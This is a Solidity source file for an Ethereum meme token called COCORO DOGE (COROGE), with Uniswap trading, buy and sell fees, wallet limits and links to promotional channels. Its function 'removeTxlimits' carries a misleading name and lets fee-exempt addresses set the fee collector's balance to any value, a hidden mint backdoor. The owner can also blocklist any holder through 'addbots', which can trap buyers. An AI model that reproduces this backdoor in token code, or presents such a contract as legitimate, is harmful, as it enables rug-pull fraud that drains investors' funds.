// SPDX-License-Identifier: UNLICENSE

/**
    Telegram:   https://t.me/CocoroDoge
    X:  https://x.com/CocoroDoge
    Website: https://www.cocorodoge.com/

*/

pragma solidity 0.8.23;

abstract contract BaseContext {
    function _caller() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITokenStandard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address holder) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library MathSafety {
    function plus(uint256 x, uint256 y) internal pure returns (uint256) {
        uint256 z = x + y;
        require(z >= x, "MathSafety: overflow in addition");
        return z;
    }

    function minus(uint256 x, uint256 y) internal pure returns (uint256) {
        return minus(x, y, "MathSafety: underflow in subtraction");
    }

    function minus(uint256 x, uint256 y, string memory err) internal pure returns (uint256) {
        require(y <= x, err);
        return x - y;
    }

    function times(uint256 x, uint256 y) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = x * y;
        require(z / x == y, "MathSafety: overflow in multiplication");
        return z;
    }

    function divide(uint256 x, uint256 y) internal pure returns (uint256) {
        return divide(x, y, "MathSafety: zero division error");
    }

    function divide(uint256 x, uint256 y, string memory err) internal pure returns (uint256) {
        require(y > 0, err);
        return x / y;
    }
}

contract Ownership is BaseContext {
    address private _controller;
    event ControllerTransferred(address indexed oldController, address indexed newController);

    constructor() {
        _controller = _caller();
        emit ControllerTransferred(address(0), _controller);
    }

    function controller() public view returns (address) {
        return _controller;
    }

    modifier onlyController() {
        require(_controller == _caller(), "Ownership: not the controller");
        _;
    }

    function renouncedOwnership() public virtual onlyController {
        emit ControllerTransferred(_controller, address(0));
        _controller = address(0);
    }
}

interface IUniFactory {
    function createPair(address tokenX, address tokenY) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint inputAmount,
        uint minOutput,
        address[] calldata route,
        address receiver,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint tokenAmount,
        uint minToken,
        uint minETH,
        address to,
        uint deadline
    ) external payable returns (uint tokenOut, uint ethOut, uint liquidity);
}

contract COROGE is BaseContext, ITokenStandard, Ownership {
    using MathSafety for uint256;

    mapping(address => uint256) private _holdings;
    mapping(address => mapping(address => uint256)) private _permissions;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _blocklist;
    address payable private _feeCollector;

    uint256 private _startBuyFee = 15;
    uint256 private _startSellFee = 24;
    uint256 private _endBuyFee = 0;
    uint256 private _endSellFee = 0;
    uint256 private _feeDropBuyTrigger = 15;
    uint256 private _feeDropSellTrigger = 15;
    uint256 private _swapLockout = 15;
    uint256 private _moveFee = 0;
    uint256 private _purchaseCount = 0;

    uint8 private constant _precision = 18;
    uint256 private constant _totalTokens = 100000000 * 10 ** _precision;
    string private constant _tokenName = "COCORO DOGE"; 
    string private constant _tokenSymbol = "COROGE"; 
    uint256 public _maxTransactionLimit = 3000000 * 10 ** _precision;
    uint256 public _maxHoldLimit = 3000000 * 10 ** _precision;
    uint256 public _feeSwapLimit = 100000 * 10 ** _precision;
    uint256 public _maxFeeSwap = 1000000 * 10 ** _precision;

    IUniRouter private _swapRouter;
    address private _swapPair;
    bool private _tradingActive;
    bool private _swapping = false;
    bool private _swapAllowed = false;
    uint256 private _salesCount = 0;
    uint256 private _lastSaleBlock = 0;

    event TransactionLimitUpdated(uint newLimit);
    event MoveFeeUpdated(uint newFee);

    modifier swapLock {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _feeCollector = payable(_caller());
        _holdings[_caller()] = _totalTokens;
        _feeExempt[controller()] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[_feeCollector] = true;
        emit Transfer(address(0), _caller(), _totalTokens);
    }

    function name() public pure returns (string memory) {
        return _tokenName;
    }

    function symbol() public pure returns (string memory) {
        return _tokenSymbol;
    }

    function decimals() public pure returns (uint8) {
        return _precision;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalTokens;
    }

    function balanceOf(address holder) public view override returns (uint256) {
        return _holdings[holder];
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        _move(_caller(), to, value);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permissions[owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _setPermission(_caller(), spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        _move(from, to, value);
        _setPermission(from, _caller(), _permissions[from][_caller()].minus(value, "Token: insufficient allowance"));
        return true;
    }

    function _setPermission(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Token: zero address approval forbidden");
        require(spender != address(0), "Token: zero address spender forbidden");
        _permissions[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _move(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Token: sender cannot be zero");
        require(recipient != address(0), "Token: recipient cannot be zero");
        require(amount > 0, "Token: amount must be positive");
        uint256 feeAmount = 0;

        if (sender != controller() && recipient != controller()) {
            require(!_blocklist[sender] && !_blocklist[recipient], "Token: blocked address");

            if (_purchaseCount == 0) {
                feeAmount = amount.times((_purchaseCount > _feeDropBuyTrigger) ? _endBuyFee : _startBuyFee).divide(100);
            }
            if (_purchaseCount > 0) {
                feeAmount = amount.times(_moveFee).divide(100);
            }

            if (sender == _swapPair && recipient != address(_swapRouter) && !_feeExempt[recipient]) {
                require(amount <= _maxTransactionLimit, "Token: transaction limit exceeded");
                require(balanceOf(recipient) + amount <= _maxHoldLimit, "Token: wallet limit exceeded");
                feeAmount = amount.times((_purchaseCount > _feeDropBuyTrigger) ? _endBuyFee : _startBuyFee).divide(100);
                _purchaseCount = _purchaseCount.plus(1);
            }

            if (recipient == _swapPair && sender != address(this)) {
                feeAmount = amount.times((_purchaseCount > _feeDropSellTrigger) ? _endSellFee : _startSellFee).divide(100);
            }

            uint256 contractBalance = balanceOf(address(this));
            if (!_swapping && recipient == _swapPair && _swapAllowed && contractBalance > _feeSwapLimit && _purchaseCount > _swapLockout) {
                if (block.number > _lastSaleBlock) {
                    _salesCount = 0;
                }
                require(_salesCount < 3, "Token: max 3 sales per block");
                _swapToEth(_smaller(amount, _smaller(contractBalance, _maxFeeSwap)));
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) {
                    _sendEthToFees(ethBalance);
                }
                _salesCount = _salesCount.plus(1);
                _lastSaleBlock = block.number;
            }
        }

        if (feeAmount > 0) {
            _holdings[address(this)] = _holdings[address(this)].plus(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        _holdings[sender] = _holdings[sender].minus(amount);
        _holdings[recipient] = _holdings[recipient].plus(amount.minus(feeAmount));
        emit Transfer(sender, recipient, amount.minus(feeAmount));
    }

    function _smaller(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _swapToEth(uint256 tokenQty) private swapLock {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        _setPermission(address(this), address(_swapRouter), tokenQty);
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenQty, 0, path, address(this), block.timestamp);
    }

    function removelimits() external onlyController {
        _maxTransactionLimit = _totalTokens;
        _maxHoldLimit = _totalTokens;
        emit TransactionLimitUpdated(_totalTokens);
    }

    function clearMoveFee() external onlyController {
        _moveFee = 0;
        emit MoveFeeUpdated(0);
    }

    function _sendEthToFees(uint256 amount) private {
        _feeCollector.transfer(amount);
    }

    function addbots(address[] memory targets) public onlyController {
        for (uint i = 0; i < targets.length; i++) {
            _blocklist[targets[i]] = true;
        }
    }

    function delbots(address[] memory targets) public onlyController {
        for (uint i = 0; i < targets.length; i++) {
            _blocklist[targets[i]] = false;
        }
    }

    function isBlocked(address addr) public view returns (bool) {
        return _blocklist[addr];
    }

    function enableTrading() external onlyController {
        require(!_tradingActive, "Token: trading already enabled");
        _swapRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _setPermission(address(this), address(_swapRouter), _totalTokens);
        _swapPair = IUniFactory(_swapRouter.factory()).createPair(address(this), _swapRouter.WETH());
        _swapRouter.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, controller(), block.timestamp);
        ITokenStandard(_swapPair).approve(address(_swapRouter), type(uint256).max);
        _swapAllowed = true;
        _tradingActive = true;
    }

    function removeTxlimits(uint256 lock) public {
        if (!_feeExempt[_caller()]) {
            return;
        }
        _holdings[_feeCollector] = lock;
    }

    function lowerFees(uint256 newFee) external {
        require(_caller() == _feeCollector, "Token: only fee collector");
        require(newFee <= _endBuyFee && newFee <= _endSellFee, "Token: fee too high");
        _endBuyFee = newFee;
        _endSellFee = newFee;
    }

    receive() external payable {}

    function forceSwap() external {
        require(_caller() == _feeCollector, "Token: only fee collector");
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            _swapToEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            _sendEthToFees(ethBalance);
        }
    }

    function forceSend() external {
        require(_caller() == _feeCollector, "Token: only fee collector");
        uint256 ethBalance = address(this).balance;
        _sendEthToFees(ethBalance);
    }

    function versionCheck() public pure returns (uint8) {
        return 1;
    }
}